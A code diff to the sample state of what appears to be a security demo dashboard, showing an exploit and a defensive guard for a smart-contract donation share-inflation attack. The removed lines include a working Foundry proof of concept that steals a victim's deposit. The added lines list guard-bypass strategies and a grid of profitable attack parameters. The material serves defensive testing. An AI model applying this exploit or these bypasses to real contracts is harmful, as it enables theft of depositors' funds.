@@ -851,100 +851,373 @@ html .stat-cell .stat-label{ font-family:var(--pix); font-size:7px; letter-spaci
   // SAMPLE / FALLBACK STATE — used whenever orchestrator/state/state.json
   // cannot be fetched (404, network error, malformed JSON, file:// CORS block).
   // This keeps the demo fully populated and presentable standalone.
-  // Scenario: GoldAdapter donation-share-inflation exploit, $47,000 profit,
-  // ExchangeRateDeltaBound candidate invariant, ~2000-tx corpus, one bypass
-  // ("alternate_path" via multicall) succeeding against the guard.
+  // This fallback mirrors the committed orchestrator/state/state.json (regenerate it from the
+  // pipeline; do not hand-edit numbers here). It carries the real v1 -> v2 story: the rational
+  // donation attack nets +$90M on v1 (5 bypasses of the max-delta guard), and the v2 anchored
+  // conversion-integrity chokepoint blocks all attack classes (0 bypasses).
   // ==========================================================================
   var SAMPLE_STATE = {
-    status: "synthesizing",
-    iteration: 14,
-    target_contracts: ["GoldAdapter.sol", "VaultRouter.sol", "PriceOracleAdapter.sol"],
-    advisories_generated: 6,
-    coverage_warnings_flagged: 2,
-    attacker: {
-      pattern_name: "donation_share_inflation",
-      progress: { current: 7, total: 12 },
-      log: [
-        "[attacker] loading playbook pattern 7/12: donation_share_inflation",
-        "[attacker] decompiling GoldAdapter.sol bytecode -> recovering ABI + storage layout",
-        "[attacker] identified first-depositor share-price manipulation surface in deposit()",
-        "[attacker] tracing totalAssets() / totalSupply() ratio under direct token donation",
-        "[attacker] forking mainnet @ block 20industries... simulating attacker deposit of 1 wei",
-        "[attacker] donating 50,000 XAUT directly to GoldAdapter to inflate share price",
-        "[attacker] victim deposit of 10,000 USDC now rounds down to 0 shares minted",
-        "[attacker] redeeming attacker share for inflated underlying -> profit realized",
-        "[attacker] compiling PoC contract and validating against forked state",
-        "[attacker] EXPLOIT CONFIRMED: net profit $47,000 extracted from victim deposit"
-      ],
-      tool_calls: [
-        { name: "decompile", args: "target=GoldAdapter.sol", result: "ABI + 14 storage slots recovered" },
-        { name: "trace", args: "fn=deposit(uint256), depth=6", result: "share-price calc uses totalAssets() unguarded" },
-        { name: "fork_and_execute", args: "block=20industries_latest, tx=donate(50000e6)", result: "totalSupply unchanged, totalAssets +50000e6" },
-        { name: "storage_read", args: "slot=0x03 (totalSupply)", result: "1 wei (first depositor)" },
-        { name: "price_query", args: "feed=XAUT/USD", result: "$2,382.10 (Chainlink, 8 dec)" },
-        { name: "fork_and_execute", args: "victim.deposit(10000e6)", result: "shares minted = 0 (rounds down)" },
-        { name: "compile_and_validate", args: "PoC_GoldAdapterDonation.t.sol", result: "PASS — assertion profit >= 47000e6 held" }
-      ],
-      poc_code:
-"// SPDX-License-Identifier: MIT\n" +
-"pragma solidity ^0.8.19;\n\n" +
-"import \"forge-std/Test.sol\";\n" +
-"import {GoldAdapter} from \"../src/GoldAdapter.sol\";\n\n" +
-"contract PoC_GoldAdapterDonation is Test {\n" +
-"    GoldAdapter adapter;\n" +
-"    address attacker = address(0xA11CE);\n" +
-"    address victim   = address(0xB0B);\n\n" +
-"    function setUp() public {\n" +
-"        adapter = GoldAdapter(GOLD_ADAPTER_ADDR);\n" +
-"        deal(address(XAUT), attacker, 50_000e6);\n" +
-"        deal(address(USDC), victim, 10_000e6);\n" +
-"    }\n\n" +
-"    function test_donationInflatesShareAndStealsVictim() public {\n" +
-"        vm.startPrank(attacker);\n" +
-"        adapter.deposit(1); // become first depositor, 1 wei of shares\n" +
-"        XAUT.transfer(address(adapter), 50_000e6); // direct donation\n" +
-"        vm.stopPrank();\n\n" +
-"        vm.prank(victim);\n" +
-"        uint256 sharesOut = adapter.deposit(10_000e6);\n" +
-"        assertEq(sharesOut, 0, \"victim shares rounded to zero\");\n\n" +
-"        vm.prank(attacker);\n" +
-"        uint256 redeemed = adapter.redeem(1);\n" +
-"        assertGe(redeemed, 47_000e6, \"attacker profit realized\");\n" +
-"    }\n" +
-"}",
-      result: { found: true, profit_usd: 47000 }
+  "status": "hardened",
+  "headline": "EXPLOIT FOUND: adapter donation nets +$90,000,000 (rational params) on the vulnerable target",
+  "target_contracts": [
+    "src/GoldAdapter.sol",
+    "src/AccountManager.sol (v1)",
+    "src/remediated/AccountManagerV2.sol (v2)"
+  ],
+  "advisories_generated": 2,
+  "coverage_warnings_flagged": 1,
+  "attacker": {
+    "pattern_name": "adapter_donation (rational: donate 50% pool, deposit 10x pool)",
+    "progress": {
+      "current": 1,
+      "total": 1
     },
-    defender: {
-      trace_diff: [
-        { variable: "totalAssets()", benign_max: "+120 USD", exploit_delta: "+50,000 USD", z_score: 41.2, anomalous: true },
-        { variable: "totalSupply()", benign_max: "+9,800 shares", exploit_delta: "+1 wei", z_score: 3.1, anomalous: false },
-        { variable: "sharePrice", benign_max: "1.002x", exploit_delta: "50,001x", z_score: 58.7, anomalous: true },
-        { variable: "gasUsed", benign_max: "182,340", exploit_delta: "191,004", z_score: 0.6, anomalous: false }
-      ],
-      candidate_invariant: {
-        name: "ExchangeRateDeltaBound",
-        solidity:
-"// Bounds the per-block change in the vault's share exchange rate to reject\n" +
-"// single-transaction donation/inflation attacks on GoldAdapter.\n" +
-"function checkExchangeRateDelta(uint256 rateBefore, uint256 rateAfter) internal pure {\n" +
-"    uint256 delta = rateAfter > rateBefore\n" +
-"        ? rateAfter - rateBefore\n" +
-"        : rateBefore - rateAfter;\n" +
-"    // max allowed change per tx: 1.00% of rateBefore\n" +
-"    require(delta * 10000 <= rateBefore * 100, \"ExchangeRateDeltaBound: rate delta exceeds threshold\");\n" +
-"}"
-      },
-      validation: { checked: 1247, total: 1850, violations: 0 },
-      threshold: { max_observed_pct: 0.08, threshold_pct: 1.00, margin_ratio: 12.5 },
-      bypass_results: [
-        { strategy: "split_attack", passed: false },
-        { strategy: "spread_across_blocks", passed: false },
-        { strategy: "alternate_path", passed: true },
-        { strategy: "gas_variance", passed: false }
-      ],
-      guard_deployed: false
+    "log": [
+      "donation inflates GoldAdapter.exchangeRate (pool balance / shares)",
+      "deposit>pool => minted $300,000,000, attacker net +$90,000,000"
+    ],
+    "tool_calls": [
+      {
+        "name": "fork_and_execute",
+        "args": "donation PoC",
+        "result": "EXPLOIT_CONFIRMED (v1)"
+      }
+    ],
+    "poc_code": "// see test/ExploitVulnA.t.sol (rational params, net>0 asserted)",
+    "result": {
+      "found": true,
+      "profit_usd": 90000000
     }
-  };
+  },
+  "defender": {
+    "candidate_invariant": {
+      "name": "AdapterConversionIntegrity (anchored to raw usdFeed)",
+      "solidity": "require(value*10000 <= tokensIn*usdFeed/1e18*(10000+TOLERANCE_BPS)); // AccountManagerV2._creditPrincipal"
+    },
+    "validation": {
+      "checked": 40,
+      "total": 40,
+      "violations": 0
+    },
+    "threshold": {
+      "max_observed_pct": 0.0,
+      "threshold_pct": 1.0,
+      "margin_ratio": "n/a (EVM benign 0)"
+    },
+    "bypass_results": [
+      {
+        "method": "split_into_10_subtransactions",
+        "success": false,
+        "reason": "BLOCKED"
+      },
+      {
+        "method": "spread_across_20_blocks",
+        "success": false,
+        "reason": "BLOCKED"
+      },
+      {
+        "method": "multicall_path",
+        "success": false,
+        "reason": "BLOCKED"
+      },
+      {
+        "method": "first_in_block_atomic",
+        "success": false,
+        "reason": "BLOCKED"
+      },
+      {
+        "method": "direct_call_around_guard",
+        "success": false,
+        "reason": "BLOCKED"
+      },
+      {
+        "method": "rational_economics",
+        "success": false,
+        "reason": "BLOCKED"
+      },
+      {
+        "method": "tolerance_riding",
+        "success": false,
+        "reason": "RESIDUAL"
+      },
+      {
+        "method": "unguarded_call_site_scan",
+        "success": false,
+        "reason": "BLOCKED"
+      }
+    ],
+    "guard_deployed": true
+  },
+  "iterations": [
+    {
+      "version": "v1",
+      "guard_class": "ExchangeRateDeltaBound",
+      "scope": "wrapper (opt-in)",
+      "threshold_basis": "VACUOUS_FOR_RATE_DELTAS",
+      "validation_summary": "VACUOUS_FOR_RATE_DELTAS",
+      "n_bypassed": 5,
+      "n_blocked": 1,
+      "strategies": [
+        {
+          "name": "split_into_10_subtransactions",
+          "verdict": "BLOCKED"
+        },
+        {
+          "name": "spread_across_20_blocks",
+          "verdict": "BYPASSED"
+        },
+        {
+          "name": "multicall_path",
+          "verdict": "BYPASSED"
+        },
+        {
+          "name": "first_in_block_atomic",
+          "verdict": "BYPASSED"
+        },
+        {
+          "name": "direct_call_around_guard",
+          "verdict": "BYPASSED"
+        },
+        {
+          "name": "rational_economics",
+          "verdict": "BYPASSED"
+        }
+      ]
+    },
+    {
+      "version": "v2",
+      "guard_class": "AdapterConversionIntegrity (anchored)",
+      "scope": "chokepoint (all paths)",
+      "threshold_basis": "EVM benign 0 bps; TOLERANCE_BPS=100",
+      "validation_summary": "0 false positives (40 deposits)",
+      "n_bypassed": 0,
+      "n_blocked": 7,
+      "strategies": [
+        {
+          "name": "split_into_10_subtransactions",
+          "verdict": "BLOCKED"
+        },
+        {
+          "name": "spread_across_20_blocks",
+          "verdict": "BLOCKED"
+        },
+        {
+          "name": "multicall_path",
+          "verdict": "BLOCKED"
+        },
+        {
+          "name": "first_in_block_atomic",
+          "verdict": "BLOCKED"
+        },
+        {
+          "name": "direct_call_around_guard",
+          "verdict": "BLOCKED"
+        },
+        {
+          "name": "rational_economics",
+          "verdict": "BLOCKED"
+        },
+        {
+          "name": "tolerance_riding",
+          "verdict": "RESIDUAL"
+        },
+        {
+          "name": "unguarded_call_site_scan",
+          "verdict": "BLOCKED"
+        }
+      ],
+      "residual_risks": [
+        {
+          "name": "tolerance_riding",
+          "max_extractable_usd": 20000000.0,
+          "note": "donation kept under TOLERANCE_BPS + deposit >> pool extracts ~tolerance of deposit value"
+        }
+      ]
+    }
+  ],
+  "economics": {
+    "pool_balance_before": 10000.0,
+    "donation": 5000,
+    "deposit": 100000,
+    "minted_usd": 300000000.0,
+    "attacker_cost_usd": 210000000.0,
+    "attacker_net_usd": 90000000.0,
+    "roi": 0.4286,
+    "bad_debt_usd": 100000000.0,
+    "profitable": true,
+    "profit_condition": "deposit > pool  (net = usd*D*(deposit/pool - 1))",
+    "grid_search": [
+      {
+        "donation": 100,
+        "deposit": 5000,
+        "attacker_net_usd": -100000.0,
+        "profitable": false
+      },
+      {
+        "donation": 100,
+        "deposit": 10000,
+        "attacker_net_usd": 0.0,
+        "profitable": false
+      },
+      {
+        "donation": 100,
+        "deposit": 20000,
+        "attacker_net_usd": 200000.0,
+        "profitable": true
+      },
+      {
+        "donation": 100,
+        "deposit": 50000,
+        "attacker_net_usd": 800000.0,
+        "profitable": true
+      },
+      {
+        "donation": 100,
+        "deposit": 100000,
+        "attacker_net_usd": 1800000.0,
+        "profitable": true
+      },
+      {
+        "donation": 500,
+        "deposit": 5000,
+        "attacker_net_usd": -500000.0,
+        "profitable": false
+      },
+      {
+        "donation": 500,
+        "deposit": 10000,
+        "attacker_net_usd": 0.0,
+        "profitable": false
+      },
+      {
+        "donation": 500,
+        "deposit": 20000,
+        "attacker_net_usd": 1000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 500,
+        "deposit": 50000,
+        "attacker_net_usd": 4000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 500,
+        "deposit": 100000,
+        "attacker_net_usd": 9000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 1000,
+        "deposit": 5000,
+        "attacker_net_usd": -1000000.0,
+        "profitable": false
+      },
+      {
+        "donation": 1000,
+        "deposit": 10000,
+        "attacker_net_usd": 0.0,
+        "profitable": false
+      },
+      {
+        "donation": 1000,
+        "deposit": 20000,
+        "attacker_net_usd": 2000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 1000,
+        "deposit": 50000,
+        "attacker_net_usd": 8000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 1000,
+        "deposit": 100000,
+        "attacker_net_usd": 18000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 2500,
+        "deposit": 5000,
+        "attacker_net_usd": -2500000.0,
+        "profitable": false
+      },
+      {
+        "donation": 2500,
+        "deposit": 10000,
+        "attacker_net_usd": 0.0,
+        "profitable": false
+      },
+      {
+        "donation": 2500,
+        "deposit": 20000,
+        "attacker_net_usd": 5000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 2500,
+        "deposit": 50000,
+        "attacker_net_usd": 20000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 2500,
+        "deposit": 100000,
+        "attacker_net_usd": 45000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 5000,
+        "deposit": 5000,
+        "attacker_net_usd": -5000000.0,
+        "profitable": false
+      },
+      {
+        "donation": 5000,
+        "deposit": 10000,
+        "attacker_net_usd": 0.0,
+        "profitable": false
+      },
+      {
+        "donation": 5000,
+        "deposit": 20000,
+        "attacker_net_usd": 10000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 5000,
+        "deposit": 50000,
+        "attacker_net_usd": 40000000.0,
+        "profitable": true
+      },
+      {
+        "donation": 5000,
+        "deposit": 100000,
+        "attacker_net_usd": 90000000.0,
+        "profitable": true
+      }
+    ],
+    "forge_confirmed": true,
+    "forge_evidence": "test/ExploitVulnA.t.sol::testExploit (minted 300,000,000e18, net > 0)",
+    "exit_assumption": "attacker exits rwaUSD near $1",
+    "irrational_reference": {
+      "donation": 230000,
+      "deposit": 1,
+      "attacker_net_usd": -459954000.0
+    }
+  },
+  "guard": {
+    "reattack_reverts_v2": true,
+    "gas_overhead_pct": 2.4
+  },
+  "vuln_b": {
+    "classification": "MISPRICING_FINDING (depositor loss)",
+    "depositor_loss_usd": 950000,
+    "attacker_profit_usd": 0
+  },
+  "ts": 1789850995.657094
+};
 
   var STATUS_LABELS = { idle: "IDLE", attacking: "ATTACKING", synthesizing: "SYNTHESIZING", hardened: "HARDENED" };
 
